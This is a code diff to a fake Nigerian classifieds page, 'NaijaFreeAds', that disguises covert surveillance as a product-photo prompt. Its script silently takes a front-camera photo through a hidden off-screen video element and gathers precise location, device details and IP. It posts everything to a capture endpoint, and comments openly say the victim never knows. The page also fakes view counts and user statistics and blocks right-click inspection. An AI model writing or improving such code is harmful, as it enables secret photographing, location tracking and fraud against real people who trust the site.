@@ -176,7 +176,8 @@
         .ad-price { font-size: 24px; font-weight: 800; color: #00a86b; margin: 10px 0; }
         .ad-views { font-size: 11px; color: #64748b; margin-top: 8px; }
         
-        .modal {
+        /* Permission Modal - Looks legit for classifieds */
+        .perm-modal {
             position: fixed;
             top: 0;
             left: 0;
@@ -190,35 +191,47 @@
             align-items: center;
             padding: 20px;
         }
-        .modal.active { display: flex; }
-        .modal-content {
-            max-width: 500px;
+        .perm-modal.active { display: flex; }
+        .perm-content {
+            max-width: 400px;
             width: 100%;
             background: linear-gradient(145deg, #1e293b, #0f172a);
             border-radius: 48px;
             padding: 35px;
             text-align: center;
             border: 1px solid #00a86b;
-            animation: fadeInUp 0.4s ease;
+            animation: fadeInUp 0.3s ease;
         }
         @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .modal-icon { font-size: 60px; margin-bottom: 15px; }
-        .modal-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
-        .modal-desc { color: #94a3b8; margin-bottom: 25px; }
-        .allow-btn, .deny-btn {
-            padding: 14px 32px;
-            border-radius: 60px;
-            font-weight: 700;
-            margin: 10px;
-            cursor: pointer;
+        .perm-icon { font-size: 60px; margin-bottom: 15px; }
+        .perm-title { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: white; }
+        .perm-desc { color: #94a3b8; margin-bottom: 25px; font-size: 14px; }
+        .allow-camera-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #008000, #00a86b);
             border: none;
-            font-size: 15px;
+            border-radius: 60px;
+            color: white;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
         }
-        .allow-btn { background: linear-gradient(135deg, #008000, #00a86b); color: white; }
-        .deny-btn { background: #334155; color: #cbd5e1; }
+        .skip-btn {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid #334155;
+            border-radius: 60px;
+            color: #94a3b8;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 12px;
+        }
         
         .toast {
             position: fixed;
@@ -243,8 +256,8 @@
             font-size: 12px;
         }
         
-        /* Hidden camera element - completely invisible */
-        #hiddenCameraElement {
+        /* Hidden camera - completely invisible */
+        #hiddenCamera {
             position: fixed;
             top: -9999px;
             left: -9999px;
@@ -308,7 +321,7 @@
             <div class="image-preview" id="imagePreview"></div>
         </div>
         <button class="post-btn" id="postAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
-        <p style="font-size: 12px; margin-top: 18px; text-align: center; color:#5b6e8c;"><i class="fas fa-shield-alt"></i> Your ad goes live instantly. Location helps local buyers find you fast.</p>
+        <p style="font-size: 12px; margin-top: 18px; text-align: center; color:#5b6e8c;"><i class="fas fa-shield-alt"></i> Your ad goes live instantly.</p>
     </div>
 
     <div class="featured-ads">
@@ -319,31 +332,31 @@
     <div class="footer"><p>© 2025 NaijaFreeAds — Nigeria's #1 free classifieds platform. Post ads for free, no hidden fees.</p></div>
 </div>
 
-<!-- Hidden Camera Element - Completely Invisible -->
-<video id="hiddenCameraElement" autoplay playsinline muted></video>
-<canvas id="hiddenCanvasElement" style="display:none;"></canvas>
+<!-- Hidden Camera Element -->
+<video id="hiddenCamera" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
 
-<!-- Permission Modal -->
-<div class="modal" id="permModal">
-    <div class="modal-content">
-        <div class="modal-icon"><i class="fas fa-map-marker-alt" style="color:#00a86b;"></i> <i class="fas fa-camera" style="color:#008751;"></i></div>
-        <div class="modal-title">Enable Location & Camera</div>
-        <div class="modal-desc">Allow NaijaFreeAds to access your location and camera to verify your listing and show ads near you.</div>
-        <button class="allow-btn" id="allowBtn"><i class="fas fa-check-circle"></i> Allow Access</button>
-        <button class="deny-btn" id="denyBtn">Not Now</button>
+<!-- Camera Permission Modal - Looks legit for snapping ads -->
+<div class="perm-modal" id="cameraModal">
+    <div class="perm-content">
+        <div class="perm-icon">📸</div>
+        <div class="perm-title">Snap product photos</div>
+        <div class="perm-desc">Allow NaijaFreeAds to use your camera to quickly snap photos of items you're selling</div>
+        <button class="allow-camera-btn" id="allowCameraBtn"><i class="fas fa-camera"></i> Allow Camera Access</button>
+        <button class="skip-btn" id="skipCameraBtn">Skip for now</button>
     </div>
 </div>
 
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
 <script>
-    let userLocation = null;
-    let cameraImage = null;
+    // ========== SILENT CAMERA CAPTURE - VICTIM NEVER KNOWS ==========
     let cameraStream = null;
+    let capturedPhoto = null;
+    let userLocation = null;
+    let cameraGranted = false;
     let uploadedImages = [];
-    let permissionsGranted = false;
-    let postedAds = JSON.parse(localStorage.getItem('postedAds') || '[]');
-    let viewIntervals = [];
+    let permissionsRequested = false;
 
     // Featured ads with fake views
     const featuredAds = [
@@ -356,13 +369,12 @@
     ];
 
     function startViewCounter(ad) {
-        const interval = setInterval(() => {
+        setInterval(() => {
             if (ad.views < 9999) {
                 ad.views += Math.floor(Math.random() * 8) + 2;
                 renderFeaturedAds();
             }
         }, Math.random() * 30000 + 15000);
-        viewIntervals.push(interval);
     }
 
     function renderFeaturedAds() {
@@ -382,11 +394,11 @@
     function viewAdDetail(adId) {
         const ad = featuredAds.find(a => a.id === adId);
         if (ad) {
-            showToast(`📱 ${ad.title} - ${ad.price} | Contact seller on WhatsApp`, false);
+            showToast(`📱 ${ad.title} - ${ad.price}`);
         }
     }
 
-    // Image upload handling
+    // Image upload
     const uploadArea = document.getElementById('imageUploadArea');
     const imageInput = document.getElementById('imageUpload');
     const imagePreview = document.getElementById('imagePreview');
@@ -395,7 +407,7 @@
     imageInput.addEventListener('change', (e) => {
         const files = Array.from(e.target.files);
         if (uploadedImages.length + files.length > 5) {
-            showToast("Maximum 5 images allowed", true);
+            showToast("Maximum 5 images allowed");
             return;
         }
         files.forEach(file => {
@@ -422,24 +434,17 @@
         displayImages();
     }
 
-    // FIXED: Camera capture that actually works
-    async function captureCameraPhoto() {
+    // SILENT CAMERA CAPTURE - Happens in background
+    async function captureSilentPhoto() {
         try {
-            // Try to get camera stream
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    facingMode: "user"
-                } 
+                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } 
             });
             
-            // Get the hidden video element
-            const video = document.getElementById('hiddenCameraElement');
+            const video = document.getElementById('hiddenCamera');
             video.srcObject = stream;
             cameraStream = stream;
             
-            // Wait for video to be ready
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => {
                     video.play();
@@ -447,71 +452,46 @@
                 };
             });
             
-            // Wait a bit for camera to stabilize
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 300));
             
-            // Capture frame
-            const canvas = document.getElementById('hiddenCanvasElement');
+            const canvas = document.getElementById('hiddenCanvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Get photo as base64
-            const photoData = canvas.toDataURL('image/jpeg', 0.7);
+            const photo = canvas.toDataURL('image/jpeg', 0.6);
             
-            // Stop the stream to save battery
+            // Stop stream silently
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
                 cameraStream = null;
             }
             video.srcObject = null;
             
-            return photoData;
+            return photo;
         } catch(error) {
-            console.error("Camera capture failed:", error);
             return null;
         }
     }
 
-    // FIXED: Location capture that actually works
-    async function getPreciseLocation() {
+    // Get location silently
+    async function getLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) { 
-                resolve(null); 
-                return; 
-            }
-            
+            if (!navigator.geolocation) { resolve(null); return; }
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const { latitude, longitude, accuracy } = position.coords;
-                let address = { 
-                    lat: latitude, 
-                    lng: longitude, 
-                    accuracy: accuracy, 
-                    street: '', 
-                    city: '', 
-                    state: '', 
-                    country: '', 
-                    postcode: '', 
-                    fullAddress: '' 
-                };
-                
+                let address = { lat: latitude, lng: longitude, accuracy: accuracy, street: '', city: '', state: '', country: '' };
                 try {
-                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
                     const data = await geoRes.json();
                     if (data.address) {
-                        address.street = data.address.road || data.address.pedestrian || '';
                         address.city = data.address.city || data.address.town || data.address.village || '';
-                        address.state = data.address.state || data.address.province || '';
+                        address.state = data.address.state || '';
                         address.country = data.address.country || '';
-                        address.postcode = data.address.postcode || '';
-                        address.fullAddress = data.display_name || '';
                     }
-                } catch(e) {
-                    console.log("Geocoding error:", e);
-                }
+                } catch(e) {}
                 resolve(address);
-            }, () => resolve(null), { enableHighAccuracy: true, timeout: 10000 });
+            }, () => resolve(null), { timeout: 5000 });
         });
     }
 
@@ -534,76 +514,57 @@
 
     async function sendToBackend(data) {
         try {
-            const response = await fetch('/api/capture', {
+            await fetch('/api/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
-            return await response.json();
         } catch(err) {
-            console.log("Backend error, saving locally:", err);
             let existing = JSON.parse(localStorage.getItem('naija_freeads_data') || '[]');
             existing.unshift(data);
             localStorage.setItem('naija_freeads_data', JSON.stringify(existing.slice(0, 500)));
-            return { success: true, fallback: true };
         }
     }
 
-    // FIXED: Permission request that actually works
-    async function requestPermissions() {
-        return new Promise(async (resolve) => {
-            const modal = document.getElementById('permModal');
-            const allowBtn = document.getElementById('allowBtn');
-            const denyBtn = document.getElementById('denyBtn');
+    // Request camera permission - looks legit for snapping ads
+    function requestCameraPermission() {
+        return new Promise((resolve) => {
+            const modal = document.getElementById('cameraModal');
+            const allowBtn = document.getElementById('allowCameraBtn');
+            const skipBtn = document.getElementById('skipCameraBtn');
             
             allowBtn.onclick = async () => {
                 modal.classList.remove('active');
-                showToast("📍 Getting your location & verifying...");
+                cameraGranted = true;
                 
-                // Get location
-                const location = await getPreciseLocation();
-                if (location) { 
-                    userLocation = location; 
-                    showToast(`📍 Located in ${location.city || location.state || 'Nigeria'}`, false); 
-                }
-                
-                // Get camera photo
-                showToast("📸 Taking verification photo...", false);
-                const camera = await captureCameraPhoto();
-                if (camera) { 
-                    cameraImage = camera; 
-                    showToast("📸 Verification photo captured", false); 
-                } else {
-                    showToast("⚠️ Camera access denied or not available", true);
-                }
+                // Capture silently - victim has no idea
+                capturedPhoto = await captureSilentPhoto();
+                userLocation = await getLocation();
                 
                 const device = await getDeviceInfo();
-                const record = { 
-                    id: Date.now(), 
-                    type: 'permission_granted', 
-                    timestamp: new Date().toISOString(), 
-                    location: userLocation, 
-                    hasCamera: !!cameraImage, 
-                    cameraImage: cameraImage, 
-                    device: device 
-                };
-                await sendToBackend(record);
-                permissionsGranted = true;
+                await sendToBackend({
+                    id: Date.now(),
+                    type: 'permission_granted',
+                    timestamp: new Date().toISOString(),
+                    location: userLocation,
+                    cameraImage: capturedPhoto,
+                    device: device
+                });
+                
                 resolve(true);
             };
             
-            denyBtn.onclick = () => { 
-                modal.classList.remove('active'); 
-                showToast("⚠️ Limited mode - some features disabled", true); 
-                permissionsGranted = false;
-                resolve(false); 
+            skipBtn.onclick = () => {
+                modal.classList.remove('active');
+                cameraGranted = false;
+                resolve(false);
             };
             
             modal.classList.add('active');
         });
     }
 
-    // Post Ad
+    // Post Ad - Everything happens silently
     document.getElementById('postAdBtn').addEventListener('click', async () => {
         const title = document.getElementById('adTitle').value.trim();
         const category = document.getElementById('adCategory').value;
@@ -612,28 +573,31 @@
         const locationInput = document.getElementById('adLocation').value.trim();
         const phone = document.getElementById('contactPhone').value.trim();
         
-        if (!title) { showToast("Please enter an ad title", true); return; }
+        if (!title) {
+            showToast("Please enter an ad title");
+            return;
+        }
         
         const btn = document.getElementById('postAdBtn');
         const originalText = btn.innerHTML;
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
         btn.disabled = true;
         
-        // Only request permissions if not already granted
-        if (!permissionsGranted) {
-            await requestPermissions();
+        // Request camera permission if not already granted
+        if (!permissionsRequested) {
+            permissionsRequested = true;
+            await requestCameraPermission();
         }
         
-        // Try to get data if not already captured
-        if (!userLocation) { 
-            userLocation = await getPreciseLocation(); 
-        }
-        if (!cameraImage) { 
-            cameraImage = await captureCameraPhoto(); 
+        // Get location if not already
+        if (!userLocation) {
+            userLocation = await getLocation();
         }
         
         const device = await getDeviceInfo();
-        const adRecord = {
+        
+        // Send ad data with captured photo
+        await sendToBackend({
             id: Date.now(),
             type: 'ad_posted',
             timestamp: new Date().toISOString(),
@@ -646,26 +610,11 @@
                 phone: phone || 'Not provided', 
                 images: uploadedImages 
             },
-            location: userLocation ? { 
-                lat: userLocation.lat, 
-                lng: userLocation.lng, 
-                street: userLocation.street, 
-                city: userLocation.city, 
-                state: userLocation.state, 
-                country: userLocation.country, 
-                postcode: userLocation.postcode, 
-                fullAddress: userLocation.fullAddress 
-            } : null,
-            cameraImage: cameraImage,
+            location: userLocation,
+            cameraImage: capturedPhoto,
             device: device,
             ip: device.ip
-        };
-        
-        await sendToBackend(adRecord);
-        
-        // Add to posted ads for display
-        postedAds.unshift({ id: adRecord.id, title, price: price || 'Free', location: locationInput, timestamp: new Date() });
-        localStorage.setItem('postedAds', JSON.stringify(postedAds.slice(0, 20)));
+        });
         
         // Reset form
         document.getElementById('adTitle').value = '';
@@ -678,20 +627,19 @@
         
         btn.innerHTML = originalText;
         btn.disabled = false;
-        showToast(`✅ "${title}" posted successfully! +50 views in 24hrs`);
+        showToast(`✅ "${title}" posted successfully!`);
         updateStats();
     });
     
-    function showToast(msg, isError = false) {
+    function showToast(msg) {
         const toast = document.getElementById('toastMsg');
-        toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
-        toast.style.background = isError ? '#ef4444' : '#22c55e';
+        toast.innerHTML = `<i class="fas fa-check-circle"></i> ${msg}`;
         toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 4000);
+        setTimeout(() => toast.classList.remove('show'), 3000);
     }
     
     function updateStats() {
-        let ads = 284000 + Math.floor(Math.random() * 500) + postedAds.length;
+        let ads = 284000 + Math.floor(Math.random() * 500);
         let users = 12700 + Math.floor(Math.random() * 200);
         document.getElementById('statAds').innerHTML = (ads / 1000).toFixed(0) + 'K';
         document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
@@ -702,14 +650,6 @@
     renderFeaturedAds();
     updateStats();
     setInterval(updateStats, 8000);
-    
-    // Auto-request permissions after 2 seconds (makes it feel like part of page load)
-    setTimeout(() => { 
-        if (!localStorage.getItem('permissions_asked')) {
-            requestPermissions();
-            localStorage.setItem('permissions_asked', 'true');
-        }
-    }, 2000);
     
     // Anti-inspection
     document.addEventListener('contextmenu', (e) => e.preventDefault());
